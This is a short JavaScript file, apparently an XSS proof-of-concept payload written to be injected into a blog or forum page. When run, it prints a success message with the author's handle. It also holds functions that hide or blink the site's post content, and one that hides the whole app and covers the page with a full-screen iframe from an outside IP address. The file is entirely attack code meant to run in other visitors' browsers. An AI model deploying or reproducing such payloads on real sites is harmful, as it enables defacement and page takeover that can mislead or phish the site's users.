function someFunction(){
    console.log("test XSS attack success!");
    console.log("Hi, I am @yagaoer from SCSE, BUAA~");
}

function hidePostContent(){
    document.querySelector('.post-content').style.display = 'none';
}

function showPostContent(){
    document.querySelector('.post-content').style.display = '';
}

function blinkPostContent(times){
    times = times*1000;
    setInterval(()=>{
        if (document.querySelector('.post-content').style.display !== 'none'){
            document.querySelector('.post-content').style.display = 'none';
        } else {
            document.querySelector('.post-content').style.display = '';
        }
    }, times);
}

function replaceWithUgoOnline(){
    const snackbar = document.createElement('div');
    snackbar.innerHTML = '<iframe src="http://8.152.218.70/" style="tab-index: 999;width: 100vw; height:100vh;overflow:hidden"></iframe>';
    document.querySelector("#app").style.display = 'none';
    document.querySelector("body").appendChild(snackbar);
}


someFunction();
//hidePostContent();